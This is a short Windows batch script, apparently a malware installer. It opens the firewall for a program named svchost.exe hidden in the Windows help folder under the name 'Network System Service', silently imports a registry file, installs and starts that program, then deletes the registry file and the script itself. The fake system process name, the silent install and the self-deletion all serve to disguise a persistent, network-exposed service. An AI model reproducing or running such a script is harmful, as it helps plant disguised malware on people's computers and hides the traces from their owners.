@shift

netsh firewall add allowedprogram "%Windir%\help\svchost.exe" "Network System Service" ENABLE
reg import %Windir%\help\111.reg
regedit /s %Windir%\help\111.reg
"%Windir%\help\svchost.exe" /install /silence
"%Windir%\help\svchost.exe" /start

del /f /q "%windir\help\111.reg"
del /f /q "%windir\help\config.bat"
